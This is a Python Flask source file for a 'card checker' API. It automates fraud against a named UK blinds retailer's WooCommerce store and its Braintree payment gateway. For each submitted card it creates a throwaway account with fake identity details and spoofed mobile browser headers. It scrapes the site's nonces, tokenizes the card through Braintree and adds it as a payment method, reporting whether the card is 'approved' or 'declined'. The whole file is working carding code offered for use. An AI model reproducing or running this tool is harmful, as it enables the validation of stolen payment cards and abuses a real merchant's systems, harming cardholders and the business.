from flask import Flask, request, jsonify
import requests
import re
import json
import base64
import random
import string
import time
import uuid
import os
from datetime import datetime

app = Flask(__name__)

def get_random_user_agent():
    agents = [
        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'
    ]
    return random.choice(agents)

def generate_random_email():
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com', 'icloud.com']
    names = ['james', 'smith', 'johnson', 'williams', 'brown', 'jones', 'davis', 'miller', 'wilson', 'moore', 'taylor', 'anderson']
    return f"{random.choice(names)}{random.randint(100, 9999)}@{random.choice(domains)}"

def generate_random_username():
    names = ['james', 'smith', 'johnson', 'williams', 'brown', 'jones', 'davis', 'miller', 'wilson', 'moore']
    return f"{random.choice(names)}{random.randint(100, 9999)}"

def get_random_uk_address():
    addresses = [
        {'line1': '123 Baker Street', 'line2': 'Marylebone', 'city': 'London', 'postcode': 'NW1 6XE', 'state': 'Greater London'},
        {'line1': '45 Oxford Road', 'line2': '', 'city': 'Manchester', 'postcode': 'M1 4AB', 'state': 'Greater Manchester'},
        {'line1': '78 King Street', 'line2': 'City Centre', 'city': 'Birmingham', 'postcode': 'B1 1AB', 'state': 'West Midlands'},
        {'line1': '22 Queens Road', 'line2': 'Clifton', 'city': 'Bristol', 'postcode': 'BS8 1LX', 'state': 'Bristol'},
        {'line1': '15 Park Lane', 'line2': 'Leeds', 'city': 'Leeds', 'postcode': 'LS1 1AA', 'state': 'West Yorkshire'},
        {'line1': '10 Castle Street', 'line2': '', 'city': 'Liverpool', 'postcode': 'L2 7NA', 'state': 'Merseyside'},
        {'line1': '5 George Street', 'line2': 'New Town', 'city': 'Edinburgh', 'postcode': 'EH2 2PA', 'state': 'Scotland'},
        {'line1': '33 Westgate Road', 'line2': '', 'city': 'Newcastle', 'postcode': 'NE1 1AE', 'state': 'Tyne and Wear'},
        {'line1': '77 High Street', 'line2': 'City Centre', 'city': 'Glasgow', 'postcode': 'G1 1AZ', 'state': 'Scotland'},
        {'line1': '50 Broad Street', 'line2': '', 'city': 'Sheffield', 'postcode': 'S1 2BX', 'state': 'South Yorkshire'}
    ]
    return random.choice(addresses)

def get_current_time():
    return datetime.now().strftime('%Y-%m-%d+H%3A%3A%3A')

def generate_random_string(length):
    characters = '0123456789abcdefghijklmnopqrstuvwxyz'
    return ''.join(random.choice(characters) for _ in range(length))

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'active',
        'endpoints': {
            '/check': 'GET with cc parameter',
            '/health': 'GET - Check API health',
            'example': '/check?cc=4111111111111111|12|26|123'
        },
        'gateway': 'Unbeatable Blinds - Braintree',
        'version': '1.0.0'
    })

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time()
    })

@app.route('/check', methods=['GET'])
def check_card():
    session = requests.Session()
    
    try:
        cc_details = request.args.get('cc')
        
        if not cc_details:
            return jsonify({
                'status': 'error',
                'message': 'CC parameter is required. Use: ?cc=cardnumber|mm|yy|cvv',
                'example': '/check?cc=4111111111111111|12|26|123'
            }), 400
        
        cc_parts = cc_details.split('|')
        if len(cc_parts) != 4:
            return jsonify({
                'status': 'error',
                'message': 'Invalid format. Use: cc|mm|yy|cvv',
                'example': '4111111111111111|12|26|123'
            }), 400
        
        cc = cc_parts[0].strip()
        mm = cc_parts[1].strip()
        yy = cc_parts[2].strip()
        cvv = cc_parts[3].strip()
        
        if not cc.isdigit() or len(cc) < 15 or len(cc) > 16:
            return jsonify({
                'status': 'error',
                'message': 'Invalid card number. Must be 15-16 digits'
            }), 400
        
        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return jsonify({
                'status': 'error',
                'message': 'Invalid month. Must be 01-12'
            }), 400
        
        if not yy.isdigit() or len(yy) != 2:
            return jsonify({
                'status': 'error',
                'message': 'Invalid year. Must be 2 digits (e.g., 26 for 2026)'
            }), 400
        
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return jsonify({
                'status': 'error',
                'message': 'Invalid CVV. Must be 3-4 digits'
            }), 400
        
        user_agent = get_random_user_agent()
        email = generate_random_email()
        username = generate_random_username()
        uk_address = get_random_uk_address()
        current_time = get_current_time()
        braintree_session_id = str(uuid.uuid4())
        device_correlation_id = generate_random_string(16)
        
        headers1 = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive',
        }
        
        response = session.get('https://www.unbeatableblinds.co.uk/my-account/', headers=headers1, timeout=30)
        
        if response.status_code != 200:
            return jsonify({
                'status': 'error',
                'message': f'Site returned HTTP {response.status_code}'
            }), 200
        
        reg_nonce = None
        patterns = [
            r'id="woocommerce-register-nonce"\s+value="([^"]+)"',
            r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
            r'woocommerce-register-nonce" value="([^"]+)"',
            r'register-nonce" value="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                reg_nonce = match.group(1)
                break
        
        if not reg_nonce:
            return jsonify({
                'status': 'error',
                'message': 'Failed to get register nonce'
            }), 200
        
        post_data = {
            'username': username,
            'email': email,
            'password': 'DDcc55@&#',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '',
            'wc_order_attribution_utm_creative_format': '',
            'wc_order_attribution_utm_marketing_tactic': '',
            'wc_order_attribution_session_entry': 'https://www.unbeatableblinds.co.uk/my-account/',
            'wc_order_attribution_session_start_time': current_time,
            'wc_order_attribution_session_pages': '3',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user_agent,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        headers2 = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.unbeatableblinds.co.uk',
            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/',
            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }
        
        response = session.post('https://www.unbeatableblinds.co.uk/my-account/', 
                                data=post_data, 
                                headers=headers2, 
                                allow_redirects=True,
                                timeout=30)
        
        headers3 = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/',
            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }
        
        response = session.get('https://www.unbeatableblinds.co.uk/my-account/edit-address/billing/', 
                              headers=headers3, 
                              timeout=30)
        
        if 'woocommerce-edit-address-nonce' not in response.text:
            return jsonify({
                'status': 'error',
                'message': 'Failed to get address nonce'
            }), 200
        
        address_nonce = None
        address_patterns = [
            r'id="woocommerce-edit-address-nonce"\s+value="([^"]+)"',
            r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"',
            r'edit-address-nonce" value="([^"]+)"'
        ]
        
        for pattern in address_patterns:
            match = re.search(pattern, response.text)
            if match:
                address_nonce = match.group(1)
                break
        
        if not address_nonce:
            return jsonify({
                'status': 'error',
                'message': 'Failed to get address nonce'
            }), 200
        
        address_data = {
            'billing_email': email,
            'billing_first_name': uk_address['city'],
            'billing_last_name': username,
            'billing_company': 'None',
            'billing_country': 'GB',
            'billing_address_1': uk_address['line1'],
            'billing_address_2': uk_address['line2'],
            'billing_city': uk_address['city'],
            'billing_state': uk_address['state'],
            'billing_postcode': uk_address['postcode'],
            'billing_phone': '12012455464',
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address'
        }
        
        headers4 = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.unbeatableblinds.co.uk',
            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/edit-address/billing/',
            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }
        
        response = session.post('https://www.unbeatableblinds.co.uk/my-account/edit-address/billing/', 
                               data=address_data, 
                               headers=headers4, 
                               allow_redirects=True,
                               timeout=30)
        
        headers5 = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/payment-methods/',
            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }
        
        response = session.get('https://www.unbeatableblinds.co.uk/my-account/add-payment-method/', 
                              headers=headers5, 
                              timeout=30)
        
        payment_nonce = None
        payment_patterns = [
            r'id="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"',
            r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"',
            r'add-payment-method-nonce" value="([^"]+)"'
        ]
        
        for pattern in payment_patterns:
            match = re.search(pattern, response.text)
            if match:
                payment_nonce = match.group(1)
                break
        
        if not payment_nonce:
            return jsonify({
                'status': 'error',
                'message': 'Failed to get payment nonce'
            }), 200
        
        client_nonce = None
        script_matches = re.findall(r'<script[^>]*>([^<]+)</script>', response.text)
        
        for script in script_matches:
            if 'wc_braintree_credit_card_payment_form_handler' in script:
                nonce_patterns = [
                    r'"client_token_nonce":"([^"]+)"',
                    r"'client_token_nonce':'([^']+)'",
                    r'client_token_nonce=([^&\s]+)'
                ]
                for pattern in nonce_patterns:
                    match = re.search(pattern, script)
                    if match:
                        client_nonce = match.group(1)
                        break
                if client_nonce:
                    break
        
        if not client_nonce:
            return jsonify({
                'status': 'error',
                'message': 'Failed to get client nonce'
            }), 200
        
        headers6 = {
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.unbeatableblinds.co.uk',
            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/add-payment-method/',
            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        ajax_data = f'action=wc_braintree_credit_card_get_client_token&nonce={client_nonce}'
        
        response = session.post('https://www.unbeatableblinds.co.uk/wp-admin/admin-ajax.php',
                               data=ajax_data,
                               headers=headers6,
                               timeout=30)
        
        result = response.json()
        
        if not result.get('success'):
            return jsonify({
                'status': 'error',
                'message': 'Failed to get client token'
            }), 200
        
        token_data = json.loads(base64.b64decode(result['data']))
        auth = token_data['authorizationFingerprint']
        
        graphql_payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': braintree_session_id
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv
                    },
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard'
        }
        
        headers7 = {
            'User-Agent': user_agent,
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {auth}',
            'Braintree-Version': '2018-05-10',
            'Origin': 'https://assets.braintreegateway.com',
            'Accept': 'application/json',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://assets.braintreegateway.com/'
        }
        
        response = requests.post('https://payments.braintree-api.com/graphql',
                                json=graphql_payload,
                                headers=headers7,
                                timeout=30)
        
        graph_result = response.json()
        
        if 'errors' in graph_result:
            return jsonify({
                'status': 'error',
                'message': f'Tokenization error: {json.dumps(graph_result["errors"])}'
            }), 200
        
        if 'data' not in graph_result or 'tokenizeCreditCard' not in graph_result['data']:
            return jsonify({
                'status': 'error',
                'message': 'Failed to tokenize card'
            }), 200
        
        token = graph_result['data']['tokenizeCreditCard']['token']
        card_bin = cc[:6]
        card_last4 = cc[-4:]
        
        payment_data = f'payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled&wc-braintree-credit-card-3d-secure-verified&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={token}&wc_braintree_device_data=%7B%22correlation_id%22%3A%22{device_correlation_id}%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={payment_nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1'
        
        headers8 = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.unbeatableblinds.co.uk',
            'Referer': 'https://www.unbeatableblinds.co.uk/my-account/add-payment-method/',
            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1'
        }
        
        response = session.post('https://www.unbeatableblinds.co.uk/my-account/add-payment-method/',
                               data=payment_data,
                               headers=headers8,
                               allow_redirects=True,
                               timeout=30)
        
        response_text = response.text
        
        if 'Nice!' in response_text or 'Avs' in response_text or 'avs' in response_text or 'successfully' in response_text.lower():
            return jsonify({
                'status': 'approved',
                'message': 'Auth Successfully',
                'card': cc,
                'bin': card_bin,
                'last4': card_last4,
                'email': email,
                'username': username
            }), 200
        else:
            error_message = 'Card declined'
            error_match = re.search(r'<div class="woocommerce-notices-wrapper">(.*?)</div>', response_text, re.DOTALL)
            if error_match:
                error_message = re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', '', error_match.group(1))).strip()
            
            return jsonify({
                'status': 'declined',
                'message': error_message,
                'card': cc
            }), 200
    
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500
    finally:
        session.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False)
